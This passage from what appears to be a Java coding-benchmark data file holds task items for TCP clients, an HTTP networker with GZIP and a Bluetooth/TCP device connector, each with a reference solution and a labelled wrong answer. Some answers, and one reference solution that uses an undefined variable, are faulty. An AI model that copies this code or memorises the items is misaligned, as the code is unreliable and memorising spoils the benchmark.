    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.io.PrintWriter;\nimport java.net.Socket;\n\npublic class TCPClient {\n\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        Socket socket = null;\n        while (socket == null) {\n            try {\n                socket = new Socket(\"localhost\", 8688);\n                mClientSocket = socket;\n                mPrintWriter = new PrintWriter(new BufferedWriter(\n                        new OutputStreamWriter(socket.getOutputStream())), true);\n                System.out.println(\"connect server success\");\n            } catch (IOException e) {\n                System.out.println(\"connect tcp server failed, retry...\");\n            }\n        }\n\n        try {\n            mBufferedReader = new BufferedReader(new InputStreamReader(\n                    socket.getInputStream()));\n            while (true) {\n                String msg = mBufferedReader.readLine();\n                System.out.println(\"receive :\" + msg);\n                if (msg != null) {\n                    System.out.println(\"server:\" + msg);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        if (!msg.isEmpty() && mPrintWriter != null) {\n            mPrintWriter.println(msg);\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (mClientSocket != null) {\n                mClientSocket.shutdownInput();\n                mClientSocket.close();\n            }\n            if (mPrintWriter != null) {\n                mPrintWriter.close();\n            }\n            if (mBufferedReader != null) {\n                mBufferedReader.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TCPClient {\n    private Socket mClientSocket;\n    private PrintWriter mPrintWriter;\n    private BufferedReader mBufferedReader;\n\n    public void connectTCPServer() {\n        try {\n            mClientSocket = new Socket(\"localhost\", 8688);\n            mPrintWriter = new PrintWriter(mClientSocket.getOutputStream(), true);\n            mBufferedReader = new BufferedReader(new InputStreamReader(mClientSocket.getInputStream()));\n\n            // Thread to listen for incoming messages\n            new Thread(() -> {\n                String serverMessage;\n                try {\n                    while ((serverMessage = mBufferedReader.readLine()) != null) {\n                        System.out.println(\"Received from server: \" + serverMessage);\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void sendMessage(String msg) {\n        if (mPrintWriter != null && !mClientSocket.isClosed()) {\n            mPrintWriter.println(msg);\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (mBufferedReader != null) mBufferedReader.close();\n            if (mPrintWriter != null) mPrintWriter.close();\n            if (mClientSocket != null && !mClientSocket.isClosed()) mClientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 58,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using HttpURLConnection for making network requests, with support for request configuration, response handling, and optional GZIP compression.\n\nClass Description: Networker is a singleton class that manages HTTP requests and responses. It uses a thread pool for asynchronous request execution and provides methods for configuring requests, handling responses, and managing connection settings.\n\nAttributes:\n\nsInstance: Networker - Singleton instance of the Networker class\nsExecutor: Executor - Thread pool executor for handling requests asynchronously\nREAD_TIMEOUT_MS: int - Timeout for reading from connection (10000ms)\nCONNECT_TIMEOUT_MS: int - Timeout for establishing connection (15000ms)\nHEADER_ACCEPT_ENCODING: String - Header key for accept encoding (\"Accept-Encoding\")\nGZIP_ENCODING: String - Value for GZIP encoding (\"gzip\")\n\nMethods:\n\nget(): void -> Networker - Returns the singleton instance of Networker\nsubmit(HttpRequest request, Callback callback): void - Submits an HTTP request for asynchronous execution\nHttpRequestTask(HttpRequest request, Callback callback): void - Constructor for the internal request task class\nrun(): void - Executes the HTTP request task\ndoFetch(): void -> HttpResponse - Performs the actual HTTP request and returns the response\nconfigureAndConnectRequest(): void -> HttpURLConnection - Configures and connects the HTTP request\nrequestDecompression(HttpURLConnection conn): void - Sets the Accept-Encoding header for GZIP compression\napplyDecompressionIfApplicable(HttpURLConnection conn, InputStream in): InputStream - Applies GZIP decompression if needed\ncopy(InputStream in, OutputStream out, byte[] buf): void - Copies data between streams\nHttpRequest(Builder b): void - Constructor for HTTP request object\nnewBuilder(): void -> Builder - Creates a new HttpRequest builder\nBuilder(): void - Constructor for HttpRequest builder\nfriendlyName(String friendlyName): Builder -> Builder - Sets friendly name for request\nmethod(HttpMethod method): Builder -> Builder - Sets HTTP method\nurl(String url): Builder -> Builder - Sets request URL\nbody(byte[] body): Builder -> Builder - Sets request body\nbuild(): void -> HttpRequest - Builds the HttpRequest object\nHttpResponse(int statusCode, byte[] body): void - Constructor for HTTP response object\nonResponse(HttpResponse result): void - Callback for successful response\nonFailure(IOException e): void - Callback for failed request",
    "Canonical_solution": "import com.facebook.stetho.urlconnection.ByteArrayRequestEntity;\nimport com.facebook.stetho.urlconnection.SimpleRequestEntity;\nimport com.facebook.stetho.urlconnection.StethoURLConnectionManager;\nimport javax.annotation.Nullable;\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.concurrent.Executor;\nimport java.util.concurrent.Executors;\nimport java.util.zip.GZIPInputStream;\n\npublic class Networker {\n  private static Networker sInstance;\n  private final Executor sExecutor = Executors.newFixedThreadPool(4);\n  private static final int READ_TIMEOUT_MS = 10000;\n  private static final int CONNECT_TIMEOUT_MS = 15000;\n  private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n  private static final String GZIP_ENCODING = \"gzip\";\n\n  public static synchronized Networker get() {\n    if (sInstance == null) {\n      sInstance = new Networker();\n    }\n    return sInstance;\n  }\n\n  private Networker() {\n  }\n\n  public void submit(HttpRequest request, Callback callback) {\n    sExecutor.execute(new HttpRequestTask(request, callback));\n  }\n\n  private class HttpRequestTask implements Runnable {\n    private final HttpRequest request;\n    private final Callback callback;\n    private final StethoURLConnectionManager stethoManager;\n\n    public HttpRequestTask(HttpRequest request, Callback callback) {\n      this.request = request;\n      this.callback = callback;\n      stethoManager = new StethoURLConnectionManager(request.friendlyName);\n    }\n\n    @Override\n    public void run() {\n      try {\n        HttpResponse response = doFetch();\n        callback.onResponse(response);\n      } catch (IOException e) {\n        callback.onFailure(e);\n      }\n    }\n\n    private HttpResponse doFetch() throws IOException {\n      HttpURLConnection conn = configureAndConnectRequest();\n      try {\n        ByteArrayOutputStream out = new ByteArrayOutputStream();\n        InputStream rawStream = conn.getInputStream();\n        try {\n          rawStream = stethoManager.interpretResponseStream(rawStream);\n          InputStream decompressedStream = applyDecompressionIfApplicable(conn, rawStream);\n          if (decompressedStream != null) {\n            copy(decompressedStream, out, new byte[1024]);\n          }\n        } finally {\n          if (rawStream != null) {\n            rawStream.close();\n          }\n        }\n        return new HttpResponse(conn.getResponseCode(), out.toByteArray());\n      } finally {\n        conn.disconnect();\n      }\n    }\n\n    private HttpURLConnection configureAndConnectRequest() throws IOException {\n      URL url = new URL(request.url);\n      HttpURLConnection conn = (HttpURLConnection)url.openConnection();\n      try {\n        conn.setReadTimeout(READ_TIMEOUT_MS);\n        conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n        conn.setRequestMethod(request.method.toString());\n        requestDecompression(conn);\n\n        SimpleRequestEntity requestEntity = null;\n        if (request.body != null) {\n          requestEntity = new ByteArrayRequestEntity(request.body);\n        }\n\n        stethoManager.preConnect(conn, requestEntity);\n        try {\n          if (request.method == HttpMethod.POST) {\n            if (requestEntity == null) {\n              throw new IllegalStateException(\"POST requires an entity\");\n            }\n            conn.setDoOutput(true);\n            requestEntity.writeTo(conn.getOutputStream());\n          }\n\n          conn.connect();\n          stethoManager.postConnect();\n          return conn;\n        } catch (IOException inner) {\n          stethoManager.httpExchangeFailed(inner);\n          throw inner;\n        }\n      } catch (IOException outer) {\n        conn.disconnect();\n        throw outer;\n      }\n    }\n  }\n\n  private static void requestDecompression(HttpURLConnection conn) {\n    conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n  }\n\n  @Nullable\n  private static InputStream applyDecompressionIfApplicable(\n      HttpURLConnection conn, @Nullable InputStream in) throws IOException {\n    if (in != null && GZIP_ENCODING.equals(conn.getContentEncoding())) {\n      return new GZIPInputStream(in);\n    }\n    return in;\n  }\n\n  private static void copy(InputStream in, OutputStream out, byte[] buf) throws IOException {\n    if (in == null) {\n      return;\n    }\n    int n;\n    while ((n = in.read(buf)) != -1) {\n      out.write(buf, 0, n);\n    }\n  }\n\n  public static class HttpRequest {\n    public final String friendlyName;\n    public final HttpMethod method;\n    public final String url;\n    public final byte[] body;\n\n    public static Builder newBuilder() {\n      return new Builder();\n    }\n\n    HttpRequest(Builder b) {\n      this.friendlyName = b.friendlyName;\n      this.method = b.method;\n      this.url = b.url;\n      this.body = b.body;\n    }\n\n    public static class Builder {\n      private String friendlyName;\n      private Networker.HttpMethod method;\n      private String url;\n      private byte[] body = null;\n\n      Builder() {\n      }\n\n      public Builder friendlyName(String friendlyName) {\n        this.friendlyName = friendlyName;\n        return this;\n      }\n\n      public Builder method(Networker.HttpMethod method) {\n        this.method = method;\n        return this;\n      }\n\n      public Builder url(String url) {\n        this.url = url;\n        return this;\n      }\n\n      public Builder body(byte[] body) {\n        this.body = body;\n        return this;\n      }\n\n      public HttpRequest build() {\n        return new HttpRequest(this);\n      }\n    }\n  }\n\n  public static enum HttpMethod {\n    GET, POST\n  }\n\n  public static class HttpResponse {\n    public final int statusCode;\n    public final byte[] body;\n\n    HttpResponse(int statusCode, byte[] body) {\n      this.statusCode = statusCode;\n      this.body = body;\n    }\n  }\n\n  public interface Callback {\n    public void onResponse(HttpResponse result);\n    public void onFailure(IOException e);\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.Executor;\nimport java.util.zip.GZIPInputStream;\n\npublic class Networker {\n    private static final Networker sInstance = new Networker();\n    private final Executor sExecutor;\n    private static final int READ_TIMEOUT_MS = 10000;\n    private static final int CONNECT_TIMEOUT_MS = 15000;\n    private static final String HEADER_ACCEPT_ENCODING = \"Accept-Encoding\";\n    private static final String GZIP_ENCODING = \"gzip\";\n\n    private Networker() {\n        sExecutor = Executors.newCachedThreadPool();\n    }\n\n    public static Networker get() {\n        return sInstance;\n    }\n\n    public void submit(HttpRequest request, Callback callback) {\n        sExecutor.execute(new HttpRequestTask(request, callback));\n    }\n\n    private class HttpRequestTask implements Runnable {\n        private final HttpRequest mRequest;\n        private final Callback mCallback;\n\n        public HttpRequestTask(HttpRequest request, Callback callback) {\n            mRequest = request;\n            mCallback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                HttpResponse response = doFetch();\n                if (mCallback != null) {\n                    mCallback.onResponse(response);\n                }\n            } catch (IOException e) {\n                if (mCallback != null) {\n                    mCallback.onFailure(e);\n                }\n            }\n        }\n\n        private HttpResponse doFetch() throws IOException {\n            HttpURLConnection conn = configureAndConnectRequest(mRequest.getUrl(), mRequest.getMethod());\n            if (mRequest.getBody() != null) {\n                conn.setDoOutput(true);\n                try (OutputStream out = conn.getOutputStream()) {\n                    out.write(mRequest.getBody());\n                }\n            }\n            InputStream in = conn.getInputStream();\n            if (conn.getContentEncoding() != null && conn.getContentEncoding().contains(GZIP_ENCODING)) {\n                in = applyDecompressionIfApplicable(conn, in);\n            }\n            byte[] body = readStream(in);\n            return new HttpResponse(conn.getResponseCode(), body);\n        }\n\n        private HttpURLConnection configureAndConnectRequest(String url, HttpMethod method) throws IOException {\n            URL requestUrl = new URL(url);\n            HttpURLConnection conn = (HttpURLConnection) requestUrl.openConnection();\n            conn.setRequestMethod(method.name());\n            conn.setReadTimeout(READ_TIMEOUT_MS);\n            conn.setConnectTimeout(CONNECT_TIMEOUT_MS);\n            conn.setUseCaches(false);\n            conn.setRequestProperty(HEADER_ACCEPT_ENCODING, GZIP_ENCODING);\n            conn.connect();\n            return conn;\n        }\n\n        private InputStream applyDecompressionIfApplicable(HttpURLConnection conn, InputStream in) throws IOException {\n            if (conn.getContentEncoding() != null && conn.getContentEncoding().contains(GZIP_ENCODING)) {\n                return new GZIPInputStream(in);\n            }\n            return in;\n        }\n\n        private byte[] readStream(InputStream in) throws IOException {\n            ByteArrayOutputStream out = new ByteArrayOutputStream();\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = in.read(buffer)) != -1) {\n                out.write(buffer, 0, length);\n            }\n            return out.toByteArray();\n        }\n    }\n\n    public enum HttpMethod {\n        GET, POST, PUT, DELETE, PATCH\n    }\n\n    public interface Callback {\n        void onResponse(HttpResponse result);\n        void onFailure(IOException e);\n    }\n\n    public static class HttpRequest {\n        private final String mFriendlyName;\n        private final HttpMethod mMethod;\n        private final String mUrl;\n        private final byte[] mBody;\n\n        private HttpRequest(Builder builder) {\n            mFriendlyName = builder.mFriendlyName;\n            mMethod = builder.mMethod;\n            mUrl = builder.mUrl;\n            mBody = builder.mBody;\n        }\n\n        public static Builder newBuilder() {\n            return new Builder();\n        }\n\n        public String getUrl() {\n            return mUrl;\n        }\n\n        public HttpMethod getMethod() {\n            return mMethod;\n        }\n\n        public byte[] getBody() {\n            return mBody;\n        }\n\n        public static class Builder {\n            private String mFriendlyName;\n            private HttpMethod mMethod = HttpMethod.GET;\n            private String mUrl;\n            private byte[] mBody;\n\n            public Builder friendlyName(String friendlyName) {\n                mFriendlyName = friendlyName;\n                return this;\n            }\n\n            public Builder method(HttpMethod method) {\n                mMethod = method;\n                return this;\n            }\n\n            public Builder url(String url) {\n                mUrl = url;\n                return this;\n            }\n\n            public Builder body(byte[] body) {\n                mBody = body;\n                return this;\n            }\n\n            public HttpRequest build() {\n                return new HttpRequest(this);\n            }\n        }\n    }\n\n    public static class HttpResponse {\n        private final int mStatusCode;\n        private final byte[] mBody;\n\n        public HttpResponse(int statusCode, byte[] body) {\n            mStatusCode = statusCode;\n            mBody = body;\n        }\n\n        public int getStatusCode() {\n            return mStatusCode;\n        }\n\n        public byte[] getBody() {\n            return mBody;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 580,
    "Instruction": "Task Description: Create a function that establishes a TCP client connection to a server, sends data, and receives a response.\n\nFunction Description: The function `showText` establishes a TCP connection to a specified server using the provided IP address and port. It sends a sequence of bytes (`seq`) to the server and reads the response. The response is parsed into a `BxResp` object. The function handles connection timeouts and IO exceptions.\n\nInput:\n- `ip`: [String] - The IP address of the server to connect to.\n- `port`: [Integer] - The port number of the server to connect to.\n- `contents`: [List<String>] - A list of strings representing the data to be sent (Note: The reference code uses `seq` for sending data, but `contents` is not directly used in the provided snippet. Clarification may be needed on how `contents` maps to `seq`).\n\nOutput:\n- The function does not explicitly return a value but processes the server's response into a `BxResp` object. If an error occurs, it prints the stack trace.\n\nNote: The reference code snippet references a variable `seq` that is not defined in the provided code. Ensure `seq` is properly initialized from `contents` or another source before calling `out.write(seq)`.",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.Socket;\nimport java.net.SocketAddress;\n\npublic static void showText(String ip, Integer port, List<String> contents) throws Exception {\n    // Create Socket\n    Socket client = new Socket();\n    // Create socket address\n    SocketAddress address = new InetSocketAddress(ip, port);\n    \n    try {\n        // Establish TCP connection\n        client.connect(address, 3000);\n        // Set read timeout\n        client.setSoTimeout(3000);\n        \n        // Create output stream\n        OutputStream out = client.getOutputStream();\n        // Create input stream\n        InputStream in = client.getInputStream();\n        \n        // Write data\n        out.write(seq);\n        \n        // Read response\n        byte[] resp = new byte[1024];\n        int len = in.read(resp);\n        \n        // Parse response\n        BxResp bxResp = BxResp.parse(resp, len);\n        \n        // Close resources\n        out.close();\n        in.close();\n        client.close();\n    } catch (IOException e) {\n        e.printStackTrace();\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\nclass BxResp {\n    // Placeholder for the BxResp class; actual implementation may vary\n}\n\npublic class TcpClient {\n\n    public void showText(String ip, int port, List<String> contents) {\n        byte[] seq = String.join(\"\", contents).getBytes(); // Convert contents to a single byte array\n\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(ip, port), 5000); // 5 seconds timeout\n            OutputStream out = socket.getOutputStream();\n            InputStream in = socket.getInputStream();\n\n            out.write(seq);\n            out.flush();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead = in.read(buffer);\n            if (bytesRead != -1) {\n                byte[] responseBytes = Arrays.copyOfRange(buffer, 0, bytesRead);\n                BxResp resp = parseResponse(responseBytes); // Assume parseResponse is defined\n                // Process resp as needed\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private BxResp parseResponse(byte[] responseBytes) {\n        // Implement parsing logic for BxResp\n        return new BxResp();\n    }\n}\n```"
  },
  {
    "Task_id": 581,
    "Instruction": "Task Description: Implement a TCP-based unicast communication class that handles both client and server roles for message exchange between two endpoints.\n\nClass Description: UnicastTestTcpSlow is a TCP unicast communication class that establishes connections, sends and receives messages, and manages socket resources. It acts as both a client (connecting to remote endpoints) and a server (accepting incoming connections).\n\nAttributes:\n- local: InetSocketAddress - Local address and port for server socket binding\n- remote: InetSocketAddress - Remote address and port for client connection\n- sock: Socket - Client socket for outgoing connections\n- output: DataOutputStream - Output stream for sending data\n- output_lock: Lock - Synchronization lock for thread-safe output operations\n- srv_sock: ServerSocket - Server socket for accepting incoming connections\n- acceptor: Acceptor - Thread that handles incoming connections\n\nMethods:\n- init(String local_addr, String remote_addr, int local_port, int remote_port) -> void - Initializes the communication by setting up server socket and attempting client connection\n- receive(Message msg) -> void - Handles received messages by printing message type\n- readMessage(byte[] buf, int offset, int length) -> Message - Static helper method to deserialize message from byte array\n\nNested Class:\n- Acceptor: Thread - Handles incoming connections and message processing\n  Methods:\n  - run() -> void - Main acceptor loop that accepts connections and processes messages\n  - handleRequest(DataInputStream in) -> void - Reads and processes individual messages from input stream",
    "Canonical_solution": "import org.jgroups.BytesMessage;\nimport org.jgroups.Global;\nimport org.jgroups.Message;\nimport org.jgroups.Version;\nimport org.jgroups.util.*;\n\nimport java.io.BufferedInputStream;\nimport java.io.BufferedOutputStream;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.atomic.AtomicLong;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class UnicastTestTcpSlow {\n    protected InetSocketAddress    local, remote;\n    protected Socket               sock;\n    protected DataOutputStream     output;\n    protected final Lock           output_lock=new ReentrantLock();\n    protected ServerSocket         srv_sock;\n    protected Acceptor             acceptor;\n\n    protected static final boolean TCP_NODELAY=false;\n    protected static final int     SOCK_SEND_BUF_SIZE=200 * 1000;\n    protected static final int     SOCK_RECV_BUF_SIZE=200 * 1000;\n\n    public void init(String local_addr, String remote_addr, int local_port, int remote_port) throws Exception {\n        local=new InetSocketAddress(local_addr, local_port);\n        remote=new InetSocketAddress(remote_addr, remote_port);\n        srv_sock=Util.createServerSocket(new DefaultSocketFactory(), \"server\", local.getAddress(), local.getPort(), local.getPort(), 0);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        acceptor=new Acceptor();\n        acceptor.start();\n\n        sock=new Socket();\n        sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n        sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n        try {\n            sock.connect(remote);\n            output=new DataOutputStream(new BufferedOutputStream(sock.getOutputStream()));\n            System.out.println(\"Connected to \" + sock.getRemoteSocketAddress());\n        }\n        catch(Throwable t) {\n            System.out.println(\"Failed connecting to \" + remote + \": will only act as server\");\n        }\n    }\n\n    protected class Acceptor extends Thread {\n        protected byte[] buf=new byte[1024];\n\n        public void run() {\n            while(!srv_sock.isClosed()) {\n                Socket client_sock=null;\n                DataInputStream in=null;\n                try {\n                    client_sock=srv_sock.accept();\n                    client_sock.setTcpNoDelay(TCP_NODELAY);\n                    client_sock.setReceiveBufferSize(SOCK_RECV_BUF_SIZE);\n                    client_sock.setSendBufferSize(SOCK_SEND_BUF_SIZE);\n                    in=new DataInputStream(new BufferedInputStream(client_sock.getInputStream()));\n                    while(!client_sock.isClosed())\n                        handleRequest(in);\n                }\n                catch(Exception e) {\n                    Util.close(client_sock);\n                    Util.close(in);\n                }\n            }\n        }\n\n        protected void handleRequest(DataInputStream in) throws Exception {\n            int len=in.readInt();\n            if(len > buf.length)\n                buf=new byte[len];\n            in.readFully(buf, 0, len);\n\n            Message msg=readMessage(buf, 0, len);\n            receive(msg);\n        }\n    }\n\n    protected static Message readMessage(byte[] buf, int offset, int length) throws Exception {\n        ByteArrayDataInputStream in=new ByteArrayDataInputStream(buf, offset, length);\n        short ver=in.readShort();\n        byte flags=in.readByte();\n        Message msg=new BytesMessage();\n        msg.readFrom(in);\n        return msg;\n    }\n\n    public void receive(Message msg) {\n        byte[] buf=msg.getArray();\n        byte   type=buf[msg.getOffset()];\n        System.out.println(\"Received message of type: \" + type);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\n\nclass UnicastTestTcpSlow {\n    private InetSocketAddress local;\n    private InetSocketAddress remote;\n    private Socket sock;\n    private DataOutputStream output;\n    private Lock output_lock = new ReentrantLock();\n    private ServerSocket srv_sock;\n    private Acceptor acceptor;\n\n    void init(String local_addr, String remote_addr, int local_port, int remote_port) throws IOException {\n        local = new InetSocketAddress(local_addr, local_port);\n        remote = new InetSocketAddress(remote_addr, remote_port);\n\n        srv_sock = new ServerSocket();\n        srv_sock.bind(local);\n        acceptor = new Acceptor();\n        acceptor.start();\n\n        sock = new Socket();\n        sock.connect(remote);\n        output = new DataOutputStream(sock.getOutputStream());\n    }\n\n    void receive(Message msg) {\n        System.out.println(\"Received message type: \" + msg.getType());\n    }\n\n    static Message readMessage(byte[] buf, int offset, int length) {\n        ByteArrayInputStream bais = new ByteArrayInputStream(buf, offset, length);\n        DataInputStream in = new DataInputStream(bais);\n        try {\n            byte type = in.readByte();\n            return new Message(type);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    class Acceptor extends Thread {\n        public void run() {\n            while (!Thread.currentThread().isInterrupted()) {\n                try {\n                    Socket client = srv_sock.accept();\n                    handleRequest(new DataInputStream(client.getInputStream()));\n                } catch (IOException e) {\n                    break;\n                }\n            }\n        }\n\n        void handleRequest(DataInputStream in) {\n            try {\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    Message msg = readMessage(buffer, 0, bytesRead);\n                    if (msg != null) {\n                        receive(msg);\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void sendMessage(Message msg) throws IOException {\n        output_lock.lock();\n        try {\n            byte[] data = serializeMessage(msg);\n            output.writeInt(data.length);\n            output.write(data);\n            output.flush();\n        } finally {\n            output_lock.unlock();\n        }\n    }\n\n    private byte[] serializeMessage(Message msg) {\n        ByteBuffer buffer = ByteBuffer.allocate(1);\n        buffer.put(msg.getType());\n        return buffer.array();\n    }\n}\n\nclass Message {\n    private byte type;\n\n    public Message(byte type) {\n        this.type = type;\n    }\n\n    public byte getType() {\n        return type;\n    }\n}\n```"
  },
  {
    "Task_id": 585,
    "Instruction": "Task Description: Create a class that handles both Bluetooth and TCP socket communication for a Pebble device, allowing data transmission and reception through either protocol based on the device address format.\n\nClass Description: The PebbleIoThread class manages connections and data transfer to a Pebble device using either Bluetooth or TCP sockets. It automatically detects the protocol based on the device address format (TCP if address contains one colon, Bluetooth if multiple colons).\n\nAttributes:\n- mIsTCP: [boolean] - Flag indicating whether TCP mode is active\n- mBtAdapter: [BluetoothAdapter] - Android Bluetooth adapter instance\n- mBtSocket: [BluetoothSocket] - Bluetooth socket for communication\n- mTCPSocket: [Socket] - TCP socket for communication\n- mInStream: [InputStream] - Input stream for receiving data\n- mOutStream: [OutputStream] - Output stream for sending data\n- mContext: [Context] - Android application context\n- gbDevice: [GBDevice] - Device information object\n\nMethods:\n- connect(): [boolean] - Establishes connection with the device (returns true if successful)\n  Input: None\n  Output: boolean - Connection success status\n  \n- write_real(byte[] bytes): [void] - Sends data to the connected device with protocol-specific framing\n  Input: byte[] - Data bytes to send\n  Output: None\n  \n- quit(): [void] - Closes all active connections and releases resources\n  Input: None\n  Output: None",
    "Canonical_solution": "import android.bluetooth.BluetoothAdapter;\nimport android.bluetooth.BluetoothDevice;\nimport android.bluetooth.BluetoothSocket;\nimport android.content.Context;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.util.UUID;\n\nclass PebbleIoThread {\n\n    private boolean mIsTCP = false;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    PebbleIoThread(Context context, GBDevice device, BluetoothAdapter btAdapter) {\n        mContext = context;\n        gbDevice = device;\n        mBtAdapter = btAdapter;\n    }\n\n    protected boolean connect() {\n        String deviceAddress = gbDevice.getAddress();\n        try {\n            int firstColon = deviceAddress.indexOf(\":\");\n            if (firstColon == deviceAddress.lastIndexOf(\":\")) {\n                mIsTCP = true;\n                InetAddress serverAddr = InetAddress.getByName(deviceAddress.substring(0, firstColon));\n                mTCPSocket = new Socket(serverAddr, Integer.parseInt(deviceAddress.substring(firstColon + 1)));\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                mIsTCP = false;\n                BluetoothDevice btDevice = mBtAdapter.getRemoteDevice(deviceAddress);\n                final UUID UuidSDP = UUID.fromString(\"00001101-0000-1000-8000-00805f9b34fb\");\n                mBtSocket = btDevice.createRfcommSocketToServiceRecord(UuidSDP);\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (IOException e) {\n            mInStream = null;\n            mOutStream = null;\n            mBtSocket = null;\n            return false;\n        }\n    }\n\n    private void write_real(byte[] bytes) {\n        try {\n            if (mIsTCP) {\n                ByteBuffer buf = ByteBuffer.allocate(bytes.length + 8);\n                buf.order(ByteOrder.BIG_ENDIAN);\n                buf.putShort((short) 0xfeed);\n                buf.putShort((short) 1);\n                buf.putShort((short) bytes.length);\n                buf.put(bytes);\n                buf.putShort((short) 0xbeef);\n                mOutStream.write(buf.array());\n                mOutStream.flush();\n            } else {\n                mOutStream.write(bytes);\n                mOutStream.flush();\n            }\n        } catch (IOException e) {\n            // Error handling\n        }\n    }\n\n    public void quit() {\n        if (mBtSocket != null) {\n            try {\n                mBtSocket.close();\n            } catch (IOException ignored) {\n            }\n            mBtSocket = null;\n        }\n        if (mTCPSocket != null) {\n            try {\n                mTCPSocket.close();\n            } catch (IOException ignored) {\n            }\n            mTCPSocket = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 1,
    "wrong_result": "```java\npublic class PebbleIoThread {\n    private boolean mIsTCP;\n    private BluetoothAdapter mBtAdapter;\n    private BluetoothSocket mBtSocket;\n    private Socket mTCPSocket;\n    private InputStream mInStream;\n    private OutputStream mOutStream;\n    private Context mContext;\n    private GBDevice gbDevice;\n\n    public PebbleIoThread(Context context, GBDevice device) {\n        mContext = context;\n        gbDevice = device;\n        String address = gbDevice.getAddress();\n        mIsTCP = address.split(\":\").length == 1;\n    }\n\n    public boolean connect() {\n        try {\n            if (mIsTCP) {\n                String[] parts = gbDevice.getAddress().split(\":\");\n                String host = parts[0];\n                int port = Integer.parseInt(parts[1]);\n                mTCPSocket = new Socket(host, port);\n                mInStream = mTCPSocket.getInputStream();\n                mOutStream = mTCPSocket.getOutputStream();\n            } else {\n                BluetoothDevice device = mBtAdapter.getRemoteDevice(gbDevice.getAddress());\n                mBtSocket = device.createRfcommSocketToServiceRecord(UUID.randomUUID());\n                mBtSocket.connect();\n                mInStream = mBtSocket.getInputStream();\n                mOutStream = mBtSocket.getOutputStream();\n            }\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n\n    public void write_real(byte[] bytes) {\n        try {\n            byte[] framedData = new byte[bytes.length + 2];\n            System.arraycopy(bytes, 0, framedData, 1, bytes.length);\n            framedData[0] = (byte) bytes.length;\n            framedData[framedData.length - 1] = (byte) 0x0A;\n            mOutStream.write(framedData);\n            mOutStream.flush();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void quit() {\n        try {\n            if (mInStream != null) mInStream.close();\n            if (mOutStream != null) mOutStream.close();\n            if (mIsTCP && mTCPSocket != null) mTCPSocket.close();\n            if (!mIsTCP && mBtSocket != null) mBtSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 587,
